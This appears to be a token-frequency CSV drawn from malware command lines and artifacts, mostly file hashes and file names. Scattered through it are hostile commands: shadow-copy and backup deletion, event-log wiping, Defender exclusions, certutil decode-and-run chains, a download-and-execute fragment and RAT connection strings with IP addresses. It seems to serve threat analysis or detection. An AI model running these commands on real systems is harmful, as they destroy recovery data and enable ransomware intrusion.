Token,Frequency
sc stop Microsoft Exchange Frontend Transport,2
sc stop Microsoft Exchange Health Manager,2
sc stop Microsoft Exchange Health Manager Recovery,2
sc stop Microsoft Exchange IMAP4,2
sc stop Microsoft Exchange IMAP4 Backend,2
sc stop Microsoft Exchange Information Store,2
sc stop Microsoft Exchange Mailbox Assistants,2
sc stop Microsoft Exchange Mailbox Replication,2
sc stop Microsoft Exchange Mailbox Transport Delivery,2
sc stop Microsoft Exchange POP3,2
sc stop Microsoft Exchange POP3 Backend,2
sc stop SQL Server Agent (TESTINSTANCE),2
sc stop SQL Server (TESTINSTANCE),2
"powershell  -Command Add-MpPreference -ExclusionExtension @(exe,dll) -Force",2
??1type_info@@UAE@XZ,2
System.IO.Directory::EnumerateFiles,2
net1 helpmsg 8,2
674676a9a4899edd08a88ee83ee94431,2
v Shell,2
wbadmin DELETE BACKUP -deleteOldest,2
wbadmin DELETE BACKUP -keepVersions:0,2
Temp +s +h,2
F tokens=* %1 in (wevtutil.exe el) DO wevtutil.exe cl %1,2
7b0d48dbbf50fe239f1097f5d01c2a6d,2
rundll32.exe user32.dll UpdatePerUserSystemParameters 0 False,2
sc config VSS start= Demand & net start VSS,2
net stop VSS & sc config VSS start= disabled,2
del %0,2
net1 stop VSS & sc config VSS start= disabled,2
powershell -command Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_,2
7bd5f3cab47339453e75fe5d5a1ee301,2
setup_Cyberon_DSpotterOfflineTestTool_v2.2.19.0.exe,2
quiet & wmic shadowcopy delete,2
C wbadmin DELETE SYSTEMSTATEBACKUP,2
t 1 ;start RuntimeBroker2,2
t 1 >nul;start RuntimeBroker2,2
powershell.exe -Command Add-MpPreference -ExclusionProcess RuntimeBroker2.exe,2
6bfabbc17a6764f2f83c38ed13796029,1
7aa5ce6f409c71bef182faceaf387e43,1
31e95cc86e76aa7be7876c1db00298ef,1
1PjRSiJ6xpJ9Z5LhIvqsi8wXhYCK82Um,1
49c3c79a2125d9373725eee658787453,1
60b118f4db37fa84767e2cfa0e214335,1
83de23a611f4a8add1b155c97ce8298d,1
279f339038c3b14884761d5a7a86f896.exe.dll,1
E&&Exit,1
4f2f8dd04ff7f0e4c346f4e04d724d20,1
d94e8d379c7924e4734e7f26612c14e1.bin.undefined,1
99dc4c1b72bc48c567d8b9122c493181,1
14da7a532ce6cf20bbc18b105faede40,1
17818f3dfec1a0ed8ae84737ae731665,1
5439f393fb99ef570edb80f6e0f48acd,1
6255c0a64cd1656e40f2c322b575cb2d,1
307d4496b2ac5a2f9eb6e712d3c0353f,1
66d4d18b1f81ddf74710bb8ec3a53151,1
8f1b09ac42fb19ac8203bb6f990313c3,1
32ef0718334ca28307ae61cfa6870b00,1
4d1e1c31cb65aed07ed7aeb0878e0545,1
6359ec3d41b7d5dc8fd6deb9eef535da,1
CryptoWallet-Tool,1
512d0b07dbf02b33c5b800f9a495610a,1
97607d88635146ef5eed30d1d045d235,1
"562b3fe812bb872f759dc3515e305274.exe.dll,DllMain",1
ff077bdcdb183a15fb869f96cd618a46.exe ff077bdcdb183a15fb869f96cd618a46.exe ENABLE,1
572e0a93f32777dc70741166784d8a44,1
3f71835b909727591fe9f1ebc9aa37d8,1
3b35c3452039f6fdee63679f82132c10,1
-UseBasicParsing | iex,1
"4db8b7887c2c314f6e217aee1d9a92a6.exe.dll,DllMain",1
27ca33f81cf897b9dac8e2c221c7f80e,1
311ce7f11fc1cec52d4166ac88fcf5c8,1
8e9dbd2bef3427ea9d1df0857ceb5fe0,1
Hack-Free Crypter,1
2559bb5002b389621b2ecd0656e96a1b,1
3b7f5bd4acb3c2be0cf08a5eb8b549f7,1
4f9d07ca6b8d5c53536a71a11fb79152,1
74f3600f8329c03d9e61ceac8abe2523,1
16fd4afb93ccb686c8cd16db13e74249,1
84ea590f481b70a014b0bcf74b114e3c,1
cvtres.exe Client 46.39.253.217 1177 WVIRSHSEP,1
How Do I Recover My Files (Readme),1
0b78d4aa39b08726bc8c5072368e0cdb,1
5b133dbbe5e5d3623972e2a4556a3935,1
3120516e465ddf23137fcb1cd23888ce,1
12fde817d9e5ee3aea4c1d31b79c2055,1
142f50d7db3fdb7a51707f53b7ef8f04.exe 142f50d7db3fdb7a51707f53b7ef8f04.exe ENABLE,1
7c7f6e87c512e1725bf502ba1233b57f,1
3ed97797fe04b19a124b29d8178942a3,1
078e26c0a9c427462b08a0c4b9bdb5eb,1
thcrap_loader.exe thpatch-en.js th06,1
9eb6b3b9a9b81037e1566442340709eb,1
8431a416f978a4368d7f5843d4b84b11,1
880c376b0ad1f353c373e8887aefc959,1
97c15f07916f598be15146ae93da1b45,1
557dd767384f7ab4d23add22471a9ee6,1
IM Glitch2,1
IM Pixels,1
IM Glitch3,1
036633e6abd89b712ec9f973f5a44ae9,1
37ecc8a2614f0eae4334dee4b15b7a64,1
9d400d71f800085093d26acea0f55711,1
5ce399bdc54f873043ff46bfbf5dfe15,1
"bb943edd9a3ff38809e498833d8682d7.exe.dll,DllMain",1
tmpC023.tmp.bat,1
14c6ed86f6de8f9ccee1aac02dcfadc4,1
2d21506fa226a0a9ebb0bbee425ca786,1
83a798247fc41b1c38a53ffba5a8e17b,1
9a3995f36731e50a6934f37c4fca1a0b,1
978183539a6a9a63fea37a38a001ac4a,1
39db4079d13454cc7f0c6698e2060e0e,1
ping  127.0.0.1 -n 22,1
ping  127.0.0.1 -n 17,1
56fcba870612d36ae276827a13c7ed8f,1
62a8b62b8fda2013aa4a3975fc683bca,1
5.9.82.114.exe,1
442d1d584aab9cbb346ec1c8c3a217c8,1
browser.exe browser.exe ENABLE,1
Microsoft.exe Microsoft.exe ENABLE,1
7bc8a5fbb67960b5f10738111624a29d,1
2vH2358,1
1Lo94vz5,1
3qG77ea,1
66ce4be770fc8927acfc33717d6f526b,1
0688f302d42febb03e48b5e5ee1d6f00,1
1f6c4728b483bd6d8e283932f530f790,1
5123968d4d2275c1d186aa6bbc00d6b4,1
899af8d62169b3b3db87ab5e3ee3e9e7,1
5a409e53ca964f3489e4f63d446131a0,1
0d96411761a23da67a016e1ee493feb4,1
6fab6d0b8128ec7762f5fe07f564dc10,1
2f44e8365589a8d75c92031abfcc9f70,1
830ad66d5cfbe6f004d974ad15de1fd1,1
79eddd96c592931272c62da0aef9bd6b,1
6328d95fc64572d5a24edfe5e2d684da,1
1EfQsaS8VkmEWFSOhOLj,1
GimmeSetup(202106101346255D8),1
outlook logging,1
SetupExe(2021061013380952C),1
CVR44B7.tmp.cvr,1
$I1J89UN,1
SetupExe(202106101346215D8),1
GimmeSetup(2021061013382052C),1
VULT+r,1
api-ms-win-crt-multibyte-l1-1-0,1
FolderProvider.dll.mui,1
firefox.exe.sig,1
UnattendProvider.dll.mui,1
api-ms-win-core-localization-l1-2-0,1
plugin-container,1
03_Music_rated_at_4_or_5_stars,1
fwlink[1],1
Popular Government Questions from USA~dgov~,1
api-ms-win-crt-utility-l1-1-0,1
plugin-hang-ui,1
CompatProvider.dll.mui,1
api-ms-win-core-processthreads-l1-1-1,1
09_Music_played_the_most,1
$I7Q2278,1
api-ms-win-crt-process-l1-1-0,1
IntlProvider.dll.mui,1
MsiProvider.dll.mui,1
api-ms-win-crt-locale-l1-1-0,1
default-browser-agent,1
Feeds Cache,1
api-ms-win-crt-time-l1-1-0,1
api-ms-win-core-timezone-l1-1-0,1
10_All_Music,1
01_Music_auto_rated_at_5_stars,1
06_Pictures_rated_4_or_5_stars,1
api-ms-win-core-synch-l1-2-0,1
07_TV_recorded_in_the_last_week,1
crashreporter-override,1
{5588ACFD-6436-411B-A5CE-666AE6A92D3D}~,1
screenshots@mozilla.org.xpi,1
$IAPE061,1
SmiProvider.dll.mui,1
08_Video_rated_at_4_or_5_stars,1
05_Pictures_taken_in_the_last_month,1
api-ms-win-crt-stdio-l1-1-0,1
formautofill@mozilla.org.xpi,1
$R7Q2278,1
firefox.VisualElementsManifest.xml,1
plugin-container.exe.sig,1
0004312E,1
api-ms-win-crt-string-l1-1-0,1
Web Slice Gallery~,1
api-ms-win-crt-private-l1-1-0,1
api-ms-win-crt-filesystem-l1-1-0,1
02_Music_added_in_the_last_month,1
11_All_Pictures,1
04_Music_played_in_the_last_month,1
api-ms-win-crt-runtime-l1-1-0,1
Feeds for United States~,1
12_All_Video,1
api-ms-win-crt-math-l1-1-0,1
DismProv.dll.mui,1
webcompat-reporter@mozilla.org.xpi,1
OSProvider.dll.mui,1
api-ms-win-crt-heap-l1-1-0,1
api-ms-win-crt-environment-l1-1-0,1
minidump-analyzer,1
api-ms-win-crt-conio-l1-1-0,1
WebSlices~,1
DismCore.dll.mui,1
doh-rollout@mozilla.org.xpi,1
api-ms-win-core-file-l2-1-0,1
api-ms-win-crt-convert-l1-1-0,1
Tracking Protection,1
api-ms-win-core-file-l1-2-0,1
TransmogProvider.dll.mui,1
webcompat@mozilla.org.xpi,1
LogProvider.dll.mui,1
WimProvider.dll.mui,1
USA~dgov Updates~c News and Features~,1
channel-prefs,1
CbsProvider.dll.mui,1
clearkey.dll.sig,1
5j1bbkcHjvljB70,1
6HIXP4sRfIg2MlbSuz,1
1d13056a185efab28ba72d73b3110d50,1
1de17653709ab892063a62f0ab7af597,1
4b9b0b44ece585056aa0c15d5bc853c5,1
6baae9f1e3,1
1D07k0,1
2D4088,1
020fded72b,1
465aa61e1dd28ea6a6d9892b6b108160,1
6c4d3f5d1d96a3c3db2f5008a4b535a7,1
0ccd87a94ecf6796fa8e5337a8949140,1
7a68090053e60daa94719c70b6dcd656,1
849fc007af1e3a1f66f91f701eaad443,1
6a03fe8dfd75c2623f65efc7606427ca,1
0itXfYtzBwZKWt9lWXRtOSN8UqxqRs1zzNnzCvoRkC1zWwallvTHUr8DaL,1
5TzZJMSvFiaPKnKmDE9gSWNSgOnd37gSyOOsjTIO,1
9b5442d3d3645ac3dce5d86108ba5f7e,1
9udM8yj41iTPPKHWUZkj,1
46nTPjB6VNoyMvlzTzbkndMu0GKdxDWWolCxRUhEh5qPkDXa,1
145dac3d15f197f301e1caa504345c9f,1
3ebf84cb57110c66769ae7f25be0858b,1
22d9269055e99e06f6eaad7952981330,1
466eadd40b3c10580e3ab4e8061161ce,1
024197f87e4548b3d71a601b08243153,1
c copy Something Something.cmd & Something.cmd,1
40b90eecf865ed36b2ee4366734aecee,1
6affcdfe1b6d6e281ef4a16cd709d675.exe 6affcdfe1b6d6e281ef4a16cd709d675.exe ENABLE,1
5279bc087d3dc3eed3294b2c93108736,1
1ve71ir6,1
4RB642Ju,1
6MD5ea7,1
cvtres.exe Client 147.185.221.17 55141 YnZwwlrYv,1
5a7e8a5fe6fa30db5c47cbe550deafa3,1
mapper (2),1
Microsoft Edge,1
#2163_02_33-2022,1
954c7d37588f3816fffe84221a26f6a2,1
2bf3ffad7a0acc4294d27801e9641458.exe 2bf3ffad7a0acc4294d27801e9641458.exe ENABLE,1
3t52A,1
2q8021,1
1o70A8,1
375c1aeb877f7f7e2f567e7adefdd7b1,1
0d2e5200572f56b9a7f6b748f22d3f40,1
3yF60ip,1
2ck5523,1
1xS13No3,1
3IA50LF,1
5eL3wl2,1
4pR420wY,1
2Vj9896,1
1lM04yN7,1
63fbcc0ae1ac43a9113bd35c5b375181,1
rMX.exe.exe,1
5638d1f75e16a31715afe98f32b5c699,1
40b2fda35b0207d66350b864d9213fcd,1
0e00fe48cb3ff29797bc3d13aeb9934e,1
5bd44e3a9ca8c78efab4333a87d84c24,1
3wdvlu3c.h0p.exe,1
gp5atqq3.fwd.exe,1
c ECHO Y,1
6b24453368b18e2b5172efcd3bb41a0e,1
"66c4c863175a4b62a982a93ed8c54b03.exe.dll,DllMain",1
93f003159c021b7b308022c269b5e39a,1
06c4ce9d785e9c34413de263f3709416,1
k move Arrest.aif Arrest.aif.cmd & Arrest.aif.cmd & exit,1
V Impacts Woman,1
Y Causes.aif *.*,1
1be6634db1202e51304cba0ed6f702ae,1
9a613dd1dcc2b822e048f77e83090cf7,1
1ba23a9372514399677c0a52b7815932,1
85bf8d8df59d94df87f721b5a694535e,1
7440edb3365d88c5881ab46286fdf6cf,1
4ad1a1fb534dc8f3e33f6541e1ebbfc8,1
Display Adaptor,1
433bdf97e9f8a9368e55a6c8ef56cf71,1
s1hw.0.bat,1
40fa9471e689823342584a3ddeeeb0db,1
6583f6d11111e3699ac83255eb11ef47,1
c ping -4 -n 1 WORKSTAT08 | findstr [,1
powershell  Invoke-RestMethod api.ipify.org,1
findstr  [,1
"mode  85,25",1
ping  -4 -n 1 WORKSTAT08,1
c powershell Invoke-RestMethod api.ipify.org,1
658dd5bedab0bf7f07c3eee08f92eef7,1
969199902d98d79f0336e8687f40ba7a,1
2d55f6f5a92275546274739b64994b29,1
"133158671282d4cdac41227ebff0c26c.exe.dll,DllMain",1
72503f41406960a5092346260b42b0b3,1
35bbfcc90063298657e35a6d57b02d6b,1
5fae2b1f05d9f7b7707266307268eaed,1
602f761fe68ac7f19b3fc389b257d2c7,1
961577809767774346c1b9995f069f6b,1
47d047c95791903b11455f07ff99a573,1
23dad938b0254901234d2c75ff2e1abd,1
TMT XIAOMI TOOL,1
03f6843b51136b7493fd9e27b4382b88,1
7208e950e834ed78d401228360919b1d,1
54d7ffedec9a5feb71e9d3c06a6e4d3a,1
ChromeUpdate.exe ChromeUpdate.exe ENABLE,1
8418ffea2a4428af86bc12aa2d28f864,1
28b94ed10bb0ddc5bd5da61115faf36b,1
9581bd9245e9d3f864a2fac526ff91ea,1
TN MM,1
5aebbcae172df0ca25c68a6bcd231342,1
Remcos Professional Cracked By Alcatraz3222,1
07e7fb814c0df9aec845ec7530f5303b,1
2f133e10739d35ce7c4de074271c1a71,1
6869f4cb46b24165daef1f98919e4e49,1
user:administrator fWys!!YkU92K,1
c echo Executed 32. You can close .,1
96450e79e9d797dadd37ecec6840147d,1
7ca20d1d62542456b38145c279678447,1
15554cda1a9cacb517cdfa6c525a11a2,1
0f242bbf134c65f469c3d93090c53ca3,1
5769d1c2c62feb23871cf51089d7e846,1
565499e6a9ddc08fc0e11efb8a703036.exe 565499e6a9ddc08fc0e11efb8a703036.exe ENABLE,1
565499e6a9ddc08fc0e11efb8a703036,1
749bcd35c919906daa0b2e4d7bf0a1e2,1
xf69c&SetupExe(20201023161828A58),1
xf69c&Microsoft Visual C++ 2010  x64 Redistributable Setup_20180201_151059242,1
xf69c&~DF1725AC0DC9D13772,1
0gQx7X9oAAofp_RMAmdZ,1
TN SYSTEM_SETTINGS,1
a a;$rootFolder,1
TN SYSTEM_CDAEMON,1
TN SYSTEM_TEST,1
ping baidu,1
267a7d6760c17f7582a6638d44dd49e2,1
4hyC6RuEv,1
1b8a62cafe0a9e2ea42b1b76ba79d029,1
2ea3a7903a0181e0ede4d827125ce5cb,1
1b6e84993e532041cbfa5cd51eab5029,1
2NA1968,1
1sI58Xe6,1
4c3f6440bc2d1ae204e208a49657bfa4,1
7a999276c284dae4d79c1565be89183c,1
GHIDGDHCGCBA & exit,1
37faa00659dcbdc2d1a5a2b8c8ad7c71,1
95034e07f5a15d9c83a4b5d748549c77,1
473be8bdcfad6cb9fe3332ec64693867,1
82a6322fe484a1d0f8f00389e4d8e077,1
8794aee98665080ae9edbcb56da48c9b,1
e049f3e3a55455fdb0fb6bf67827f1e1.exe e049f3e3a55455fdb0fb6bf67827f1e1.exe ENABLE,1
5397ff1e628fdeba436916a9f9984619,1
0cc6cdcded103718e4ad58787f8cc0f2,1
8e4392040a53bf5e29afcb25c5f97e6c,1
System.exe System.exe ENABLE,1
IM chrome,1
06880ecfec7f2c3414f801021cceaf3d,1
)[-1]),1
97c3932e559957033c111910cbafdbcb,1
joker-hell.exe joker-hell.exe ENABLE,1
joker-hell,1
01af6f6c07b936e91b74bec0e661e623,1
9919a82969ac87f21264c2040c85a48f,1
777a68647afe7b3d6d974a99c770d345,1
5uVpfI00RtaEYMFm,1
491cb3c1a18c1b0f8fae93a024aa12b0,1
389421b1602a4e078fe8cb624c148bc8,1
RegAsm.exe RegAsm.exe ENABLE,1
88e51ca5b2339ba2a8f45489b1c5a686,1
Readme_now.txt >> cry.ps1 & exit,1
0c87818ae63b6893cda71c40175cafbe,1
System:Service:,1
02a877e7f609518df479fa3d19ed3901,1
6b6841f2f9b543ed56e357d8f894bc3a,1
112fb060f5a6132d89716f0df83aa10f,1
3622d77fe96480bd8a9df9a6dbb169c3,1
625484dbe9f22385e6398050d890d6fd,1
8be790f752566ce25db96d153e102a68,1
im 8be790f752566ce25db96d153e102a68,1
61f49644eab9196eacc866903c8c79c0,1
37ab59298c7806b83e4cb2307eec9bc6,1
455c223c97858dd99e402ea1cd1b4ee3,1
13a2c365581b3b01583085ab18be2d4a,1
nslookup zonealarm.bit ns1.corp-servers.ru,1
nslookup ransomware.bit ns2.corp-servers.ru,1
nslookup zonealarm.bit ns2.corp-servers.ru,1
nslookup ransomware.bit ns1.corp-servers.ru,1
7d282eea524d5cb31d04be2c20bab4b7,1
6f86fbc1cda5559640e724dcb9ed2dc5,1
celestial-cracker,1
celestial-cracker.exe celestial-cracker.exe ENABLE,1
9170596eee039fed880c3ad572633f39,1
0225aeb54845c069754af622b26b8995,1
ole32.dll.OleLoad,1
user32.dll.DdeConnect,1
c39557ae2dd15b054a8820419f9f8810.exe c39557ae2dd15b054a8820419f9f8810.exe ENABLE,1
c copy Till.wma Till.wma.cmd & Till.wma.cmd,1
Y Daughters.wma *.*,1
V Compiler Exchanges,1
59d4afb66b5c7402af994f7ba893c790,1
8f8a0b381eab4a943daafcef6a1294e8,1
527222800131fd6d177b566abdf341ac,1
61911003c02854bd6352c3b3fb4fc1d3,1
0a2091b71c2fa75b16738e7fc0678e48,1
50ea2537a932b62c1b75d450474f5ca0,1
watchdog.vbs.bat,1
1e0e4a6d5e51c952869d5cc21ddf5818,1
1fdf843dd6e359b73bad4c9cd5260722,1
9bfe51a1642a675844214c3c18cf30b5,1
83e2a572adb6aeb6243c1540c49cd364,1
1a54V8,1
2r7103,1
"22e1fc3d8ecf1f1338954f2582781da1.exe.dll,DllMain",1
75732bfc7215084dbb19b4cfd3bfb8e1,1
56ab428e93cd76fc81bccf04b3e1d272,1
1b93d850ec455566ed44ad6dca342d31,1
R ^kRZuMjyBJtsZkHQEHRpy$ Magro,1
certutil  -decode Ma,1
ping  127.0.0.1 -n 30,1
R ^wSZJdQSZwKBWJCtpbfZHNwzsXALug$ Ansiosa,1
c certutil -decode Viso.pdf Fara.pdf & cmd < Fara.pdf,1
certutil  -decode Ascoltami.vsd Tue.html,1
c TxoIPAEm,1
2a5b52efa7d7073047ca224c51ee273f,1
certutil  -decode Viso.pdf Fara.pdf,1
c certutil -decode Ascoltami.vsd Tue.html & cmd < Tue.html,1
atikmdag-patcher 1.4.7.exe,1
certutil  -decode Ne,1
c YwQV,1
3uwLgX2542rwmGNq7VBz,1
06e9afea63b60013fa4cd29947bbea66,1
168ab9bafe5f7a225571c9ca75a0b148,1
ping  127.0.0.1 -n 31,1
ping  127.0.0.1 -n 29,1
5591ff9c922bc41f9ec07b06a18d3f00,1
7fd819fa6fd4f4db3b7d920e1f2985c7,1
40781df9d4f11e1c4fe6925350d693d2,1
88cd9ad55b0a2a0f5bf7f8308df1be20,1
0d3bef3ee5c7489ab921b9066890256c,1
"Clodpate.Pat;$Ammodytoid=$Borele.SubString(53793,3);.$Ammodytoid($Borele)",1
5d90197758440b6cbd7c54d7d7d8bed3,1
5355d261bbe80af6c9d366775386fd48,1
7ef8d225e33c07a859a055fb97841b53,1
9f90f1c8936cf89740771e134a2d4066,1
3b280d94,1
137de17899318bab16e5287202f129ba,1
1446c1697c61024b7118db828f94f188,1
9260b00ee0f3b244f78b505aa434cb4a,1
51eb3ae16473a588f04c2f3318c1e934,1
7beb28f106ab2e72369f0676b2d5664e,1
3f274ec2e05fbdf2f8f3214acac7db6c,1
043850aca35e85df88b2011f8e28162c,1
setup.exe setup.exe ENABLE,1
net1  user a,1
net  user a,1
net1  user,1
net  user,1
20b4227596f781cf3642b3b03ea68d89,1
"1f2cb643e7b6727871619666502f4c7a.exe.dll,DllMain",1
367621c14b8ae090114ddd8971b2cbc8,1
4d08c58eed5ff892b1f0884e9281bef8,1
010c6e851bde281cdfb9180d31cc8b66,1
2c21ca10a50f04eafdcdd775ce648b1d,1
9ab0cb6742868ec1d643809c0ac1552d,1
8kPsHmvrEcJwjafU40gzsGMXV7Gtxc,1
0254df4840857aa3b11c16fdda1ccb56,1
pid 2876,1
0611594f7b8891094237efb0414c6584,1
b229adf5acb67e182ad7fdf64084bce9.exe.dll,1
8067159738a10c887ec84b93d7411d72,1
48529d3cacd250d5212516a71394292e,1
2a86032c43740f457c743df9a08607cc,1
4d91e5ee596563ce152385efcde8f6c9,1
171904836c,1
8PdcY8X,1
2e06bd3cf5,1
6addbacbfe,1
9j6CCih,1
9ILuIMngNdMuzngHHMAY9BVvKTDwm0yZ13RpFsRY,1
5G5G1KH0qy,1
684f480e60f3ad285fcecffed297004a,1
3828c3958908e5481db5bd59ebf85a26,1
4be7317ed4b0fe836392b98cbba14f82,1
1a1fd66aec34c915ebe76e80ecf5052d,1
n 300,1
1c6622efe4082c34414ad799784b88a9,1
ping  127.0.0.1 -n 100,1
10fb4a9988af98b7bb569aa0249e262b,1
8012cbbdce4709925342cfe98eb57eae,1
6b2b787c99d5ba7a5cff476c7e19d504,1
4554427aeb634ae4cf5aefb355593e85,1
"4445cf0ca4f74e0edbbc9f14ad574196.exe.dll,DllMain",1
XWorm V5.4.exe,1
20fefe798ba4e0c69d259849947df18b,1
5bc4V3lt5Q,1
7455c1fea16d2e9ce3a361ec11d766ff,1
73dad6b51d6761cf890699c570d10e5d,1
21f7fd75d05ae83cc08ad268ba543e1b,1
3e0cbc73c6b01de83f1f9bc7e6310c0f,1
"rundll32.exe Shell32.dll,Control_RunDLL -h",1
6f408eba79708fbb70738c55d40cbdd3,1
686a036183b2ea50dbee02f54b2ec685,1
"e14c0cf483ef2dc0119a76cef97a14be.15023.dll,DllMain",1
Adobe Reader PDF,1
89a066b573d095f9a983300a97cbebf4.exe 89a066b573d095f9a983300a97cbebf4.exe ENABLE,1
0bf3de2b80009a038ebb821fb3d7b455,1
95baa85192c5ca05747c473a8fd73ce9,1
20f7fca24addaa9f1cc4e30811556dd3,1
172f9dc9e9e8fe7449f14c680e059f79,1
jwpnkvvv.pif pftqfsgt.ini,1
wscript.exe Update-kj.r.vbe,1
1a0574d2554a51c828495e18c454e210,1
e88fc7f7-48bf-429f-9159-ef167538cb5a,1
a6aa5501-0670-4762-bc98-ebf117c838d2,1
78b6a495-7e50-417d-97dd-4db78677d452,1
411587c5-da1f-4425-add6-ee0d6f8e36c0,1
11a1c2c1-29ec-4f50-b464-76f45be62870,1
6cc41ec7-4d4d-49f1-a879-35bef27433af,1
20916f1d-62df-4729-9222-7cf8341ecea9,1
9e478d82-4ddf-4ad4-9f4c-a606d2c12eaf,1
e8d20a76-affa-49bd-aaef-cffb9aaeb89e,1
8e400b6d-243d-4a9e-9266-815ce10ed6fb,1
a4d49c3d-2870-4524-bfc1-168575472ca9,1
dc3a709b-50f6-47bf-9923-3b01172e515d,1
9df31ef9886d9d58e3bfdcb6f5b263b6,1
168c12e4c52012059c38d9a4696d23d1,1
9d9821be1cf1532058af43be7bc56fbf,1
3e5d740863,1
13ef164cc4d3e63e6b283c1ab0d7a79d,1
2368ce5ea3e78cbd9d2c2a5176d5cd46,1
yeykydun) -usebasicparsing),1
96d013c0645c0550821872aa67ff88d1.exe.dll,1
"WgwQLdesN,i);}catch(e){}},10);",1
RIQLW));close();,1
5HeHBeYSAA2CwTO9pvGy,1
shutdown  -r -t 0,1
0077bab447ee5e92ab4ffd37122ff800,1
7d6df368b34fc9ab971aa32061eaed21,1
1d8514e297fa1802ac77a1b22c50bb1e,1
62658f66e8f431689296011feb80a706,1
579697ce2a7f3ca37cd8173506ba3d76,1
Developer Romaklao Luacher,1
Grabber (LOGS ALL INFO),1
RAT (Remote Access TOOL),1
16ad62cddf7887ec9499cb3e2a361fa5,1
"62310.cmd,::,,runas,0)(window.close)",1
X-AverRay,1
X-AverRay.exe X-AverRay.exe ENABLE,1
"12fbf013e77f8c0c2547c0e50fdc911c.dat-decoded.dll,DllMain",1
netsh  winsock reset,1
5e07bcdd8a5d9ff35afb19bd29f239f9,1
289(88885),1
832a9d01362726c1bb4674c540fe24f0,1
x69..exe,1
122caf8f18d71321d3b78525548079b8,1
powershell.exe Test-Connection www.google.com,1
3ddaadbaff157552765c87c199c814e0,1
17d51198bbd8f292d907685562389a91,1
7f084b016dec9c08ab8b2a19d7a9dadc,1
3e76cc7d228cdeb9c2a179003a79e015,1
"e10316208159effee1887c10a7704dba.exe.dll,DllMain",1
35b5d49b212c39af12e851efefaae245,1
4f7b7232a9983a744c9df0175b69fded.exe 4f7b7232a9983a744c9df0175b69fded.exe ENABLE,1
85c0401bb30ddf06e0a506531976bdb8,1
88ogwYL1cNrEwLLBhwUIfDzd8org7SIyIhhneCIC,1
9982eiMdnelk8sztqtAK,1
6d0b6b235241e115456ed5d81daf6722,1
"dl.php?id=458&c=1002,i0.exe)",1
20d507d4c5abbaaab6e8e7fa716c45c1,1
150ea6fbf78463c3245b86b7ef572e8e,1
8f73882464c30ae5e290e68fc6d23fff,1
27005166089a462a3466fd9f89f4acf5,1
6f7eeb7523d5c42223aebf5537e27a4c,1
9cb0ea5479999dcc8e85ff769c0d19df,1
tmpF611.tmp.cmd,1
"fb52713b133c21078f00a43baa76affa.exe.dll,DllMain",1
85dd78ab8cde1e14aff5afa6a3bff29f,1
4cca929ba3c2ee0159982f7da6c4e447,1
99715fe9343058c03acba05825c85aa8,1
1yEJ1LJx7Aonc2gKvRqS,1
IM WareChop,1
198839a8eafa79135faa85b412a194f6,1
5931a151fe7dca9c6928343c6dfb639c,1
Google Chrome.exe Google Chrome.exe ENABLE,1
baks-zapret,1
baks-zapret.exe -OutFile baks-zapret.exe,1
46225a3c626f7ec1667c4c79295bf18c,1
067cec37c8783fa7bfc884b1a5aa0e55,1
587ce728afb95d35657f34c04ad8484c,1
04677e87acd2ed9752d2a9f872fe702a,1
9fca843b82b8d7f508cedce34a3de266,1
icsys.icn.exe,1
net1 helpmsg 2,1
9c9288775ff618850d3d90ac9d7ce6ae,1
6e908168d70af96b177016d8f631c1d5,1
Santo Executor,1
6b891db97f0100ce6415371a662aa35c,1
6c91db1a0945a077b89f57ba8518ab3d,1
3X74g,1
1q83T4,1
2X4635,1
83064d79b231b4e91151482872ee7fd3,1
?p=gmzgcobuge5gi3bpgu4dkmbz,1
7818d71982cf197d173effe7b3720c48,1
98766de64ad091f1d4f5330f8432819a,1
cvtres.exe r00t necessary-sick.gl.at.ply.gg 32835 DsCbljCVL,1
"537277f7d84c669a0ed05c20d6b797e7.exe.dll,DllMain",1
71ff9193edd19c1ba1bd43f585b93a1d,1
62f0146c3d5c0136f281b2a3acb5ddff,1
62f8d836b21a35d2d60f06e4ab0d0d59,1
07fb4fd3f3bb499c1b9f3d0bc89ac1fa,1
831c6aed5d315daff67ca2af4359fad2,1
4815669f0b9b54bbd9f9f3634bf8aaaa,1
1a6c694d420432f5815bfe39a6f66c95,1
1AGrZ1unMb,1
25c48f35e66dd2b3c3bae9a17c2b17ac,1
2f868dac4e144daee53e8c2e40af0231,1
217b0a7c4e0681ea9205c1eb9ce2eab3,1
42647fce99c198d4c4eb05f9ac69a592,1
36395a50ed78215bc1e5ae1e438975a0,1
737248e7773a10bfbf370654f1b586fc,1
4ea3e43e53b8496c4ed9240fded8fb4b,1
ui-dash,1
10a8a88f994457d3d47b65b3733dff20,1
Severn.exe Severn.exe ENABLE,1
0a88e8c5d10d61734a9fb60f89d22552,1
